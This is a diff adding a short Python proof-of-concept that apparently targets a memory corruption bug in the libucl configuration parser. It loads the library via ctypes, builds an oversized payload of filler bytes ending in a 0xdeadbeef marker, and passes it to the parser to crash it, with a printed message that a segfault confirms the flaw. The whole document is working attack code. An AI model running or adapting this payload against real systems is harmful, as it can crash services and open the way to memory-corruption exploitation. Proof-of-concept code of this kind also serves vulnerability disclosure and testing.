@@ -1,0 +1,8 @@
+#!/usr/bin/env python3
+# PoC for libucl memory corruption -- run this to crash the parser
+import ctypes
+lib = ctypes.CDLL("libucl.so")
+payload = b"A" * 100000 + b"\x00" * 8 + b"\xef\xbe\xad\xde"
+p = lib.ucl_parser_new(0)
+lib.ucl_parser_add_string(p, payload, len(payload))
+print("If you see a segfault the vulnerability is confirmed")
